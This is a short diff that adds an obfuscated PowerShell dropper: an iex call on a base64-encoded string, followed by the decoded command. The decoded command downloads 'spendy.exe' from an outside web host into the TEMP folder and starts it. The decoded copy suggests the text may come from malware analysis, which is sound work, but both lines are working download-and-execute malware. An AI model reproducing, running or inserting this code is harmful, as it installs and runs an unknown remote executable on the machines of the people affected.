@@ -1,0 +1,7 @@
+iex([SysTEm.tExt.ENcOdInG]::UTF8.GetSTRInG([SYSTEm.CoNVErT]::FRoMbaSe64StriNg('CihOZXctT2JqZWN0IFN5c1RFTS5uZXQud0ViY2xJZW50KS5Eb1duTE9BRGZJbGUoJ2h0dHA6Ly9sYWJpZC5jb20ubXkvc3BlL3NwZW5keS5leGUnLCIkRW52OlRFTVBcc3BlbmR5LmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkRW52OlRFTVBcc3BlbmR5LmV4ZSIpCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysTEM.net.wEbclIent).DoWnLOADfIle('http://labid.com.my/spe/spendy.exe',"$Env:TEMP\spendy.exe");Start-Process ("$Env:TEMP\spendy.exe")
+
